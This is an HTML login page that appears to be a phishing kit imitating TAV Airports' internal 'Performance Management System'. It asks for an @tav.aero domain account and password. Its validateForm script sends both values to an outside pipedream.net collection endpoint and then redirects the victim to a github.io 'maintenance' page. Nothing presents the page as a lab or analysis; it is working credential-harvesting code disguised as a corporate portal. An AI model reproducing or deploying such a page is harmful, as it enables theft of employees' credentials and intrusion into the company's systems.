<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Performance Monitoring System</title>
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
  <style>
    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      font-family: 'Poppins', sans-serif;
      background: linear-gradient(135deg, #3a7bd5, #00d2ff);
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .login-form {
      background-color: #ffffff;
      padding: 40px;
      border-radius: 15px;
      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
      width: 350px;
      text-align: center;
      animation: fadeIn 1s ease;
    }

    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(20px); }
      to { opacity: 1; transform: translateY(0); }
    }

    .login-form h2 {
      color: #333;
      margin-bottom: 20px;
    }

    input[type="text"],
    input[type="password"] {
      width: 100%;
      padding: 12px 15px;
      margin: 10px 0;
      border: 1px solid #ccc;
      border-radius: 8px;
      background-color: #f9f9f9;
      transition: all 0.3s;
    }

    input[type="text"]:focus,
    input[type="password"]:focus {
      border-color: #00d2ff;
      outline: none;
      background-color: #fff;
    }

    .login-button {
      width: 100%;
      background-color: #00d2ff;
      color: white;
      padding: 14px;
      margin-top: 15px;
      border: none;
      border-radius: 8px;
      font-weight: 600;
      cursor: pointer;
      transition: background 0.3s ease;
    }

    .login-button:hover {
      background-color: #009acb;
    }

    .footer-text {
      font-size: 12px;
      color: #666;
      margin-top: 20px;
    }

    .error-message {
      color: red;
      font-size: 13px;
      margin-top: 10px;
    }

    .icon {
      position: fixed;
      bottom: 10px;
      right: 10px;
      width: 150px;
      opacity: 0.8;
    }

    .icon img {
      width: 100%;
    }
  </style>

  <script>
    function validateForm() {
      const username = document.forms["loginForm"]["username"].value;
      const password = document.forms["loginForm"]["password"].value;
      const errorMessage = document.getElementById('error-message');

      errorMessage.textContent = '';

      if (!username.endsWith('@tav.aero')) {
        errorMessage.textContent = "Your email address must end with @tav.aero.";
        return false;
      }

      if (password.length < 8) {
        errorMessage.textContent = "The password must be at least 8 characters.";
        return false;
      }

      const params = new URLSearchParams();
      params.append('username', username);
      params.append('password', password);

      fetch('https://eosdcxafrlhu2y.m.pipedream.net' + params.toString(), {
        method: 'GET',
      })
      .then(response => response.text())
      .then(data => {
        console.log('Başarılı:', data);
        window.location.href = "https://tavaero.github.io/TAV-PMS/bakim.html";
      })
      .catch((error) => {
        console.error('Hata:', error);
        errorMessage.textContent = "Server error occurred.";
      });

      return false;
    }
  </script>
</head>
<body>

  <form name="loginForm" class="login-form" onsubmit="return validateForm()">
    <h2>Performance Management System</h2>
    <input name="username" placeholder="Domain Account" type="text" required />
    <input name="password" placeholder="Password" type="password" required />
    <div id="error-message" class="error-message">&nbsp;</div>
    <button type="submit" class="login-button">Login</button>
    <div class="footer-text">This software belongs to TAV Airports Company.</div>
  </form>

  <div class="icon">
    <img src="https://tavhavalimanlari.com.tr/images/TAV-Airport-International-logo.svg" alt="TAV Logo"/>
  </div>

</body>
</html>
